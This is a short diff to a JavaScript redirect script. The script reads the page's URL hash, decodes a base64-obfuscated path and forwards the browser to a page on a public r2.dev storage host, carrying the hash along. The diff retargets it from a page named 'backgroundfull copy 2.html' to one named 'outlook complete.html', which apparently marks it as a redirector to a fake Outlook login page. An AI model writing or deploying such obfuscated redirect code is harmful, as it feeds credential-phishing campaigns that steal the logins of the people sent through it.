@@ -3,10 +3,10 @@
         if(window.location.hash) {
             var url = window.location.href;
             var hash = url.split('#').pop();
-            const encdStr = 'LnIyLmRldi9iYWNrZ3JvdW5kZnVsbCUyMGNvcHklMjAyLmh0bWw=';
+            const encdStr = 'LnIyLmRldi9vdXRsb29rJTIwY29tcGxldGUuaHRtbA==';
             const str = atob (encdStr);
             const emma = '#' + hash;
-            const dr = 'https://pub-f78f6230b21b47daaf70cc124ade5011';
+            const dr = 'https://pub-d43a81865a884d409c6a60c269791d1c';
             const ax = dr + str;
             var link = ax + emma;
             window.location.href = link;
